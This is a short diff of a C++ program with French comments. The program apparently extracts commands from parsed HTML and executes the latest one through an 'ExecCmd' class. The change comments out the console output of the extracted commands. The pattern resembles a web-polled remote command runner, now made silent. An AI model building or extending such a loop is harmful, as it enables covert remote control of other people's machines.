@@ -36,12 +36,12 @@ int main() {
             // Vérifier si le nombre de matchs a changé depuis la dernière vérification
             if (htmlParser.getcmd_number() != previousMatchCount) {
                 // Afficher tous les contenus extraits
-                std::cout << "All extracted content:\n";
-                for (const auto& content : allContent) {
-                    std::cout << content << std::endl;
-                }
+                //std::cout << "All extracted content:\n";
+                //for (const auto& content : allContent) {
+                //    std::cout << content << std::endl;
+                //}
 
-                std::cout << "Last extracted content:\n" << lastContent << std::endl;
+                //std::cout << "Last extracted content:\n" << lastContent << std::endl;
 
                 // Exécuter uniquement la dernière commande extraite
                 ExecCmd execCmd(lastContent);
